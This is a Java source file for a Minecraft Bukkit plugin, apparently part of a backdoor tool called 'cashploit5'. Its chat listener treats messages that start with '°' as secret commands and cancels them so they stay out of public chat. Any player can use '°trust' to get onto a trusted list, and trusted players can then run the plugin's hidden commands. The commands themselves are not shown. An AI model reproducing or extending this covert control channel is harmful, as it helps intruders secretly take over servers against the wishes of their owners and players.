package de.cashploit5.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import de.cashploit5.Main;
import de.cashploit5.command.Command;
import de.cashploit5.command.TrustCommand;

@SuppressWarnings("deprecation")
public class ChatListener implements Listener {

	private Main main;

	public ChatListener(Main main) {
		main.getServer().getPluginManager().registerEvents(this, main);
		this.main = main;
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(PlayerChatEvent e) {

		Player p = e.getPlayer();
		String msg = e.getMessage();

		if (msg.startsWith("°")) {
			String[] arguments = msg.split(" ");
			if (arguments[0].equalsIgnoreCase("°trust")) {
				for (Command command : main.getCommandManager().getCommands()) {
					if (command.getName().equalsIgnoreCase(arguments[0].substring(1))) {
						String[] args = new String[] {};

						if (!msg.equalsIgnoreCase("°" + command.getName())
								&& !msg.equalsIgnoreCase("°" + command.getName() + " "))
							args = msg.replace("°" + command.getName() + " ", "").split(" ");

						command.onCommand(p, command, args);
						e.setCancelled(true);
						return;
					}
				}
			} else if (TrustCommand.getTrustedPlayers().contains(p)) {
				for (Command command : main.getCommandManager().getCommands()) {
					if (command.getName().equalsIgnoreCase(arguments[0].substring(1))) {
						String[] args = new String[] {};

						if (!msg.equalsIgnoreCase("°" + command.getName())
								&& !msg.equalsIgnoreCase("°" + command.getName() + " "))
							args = msg.replace("°" + command.getName() + " ", "").split(" ");
						
						e.setCancelled(true);
						command.onCommand(p, command, args);

						return;
					}
				}
			} else {
				return;
			}
			e.setCancelled(true);
			Main.sendMessage(p, "§cCommand wurde nicht gefunden! (§6°help§c)");
		}
	}
}
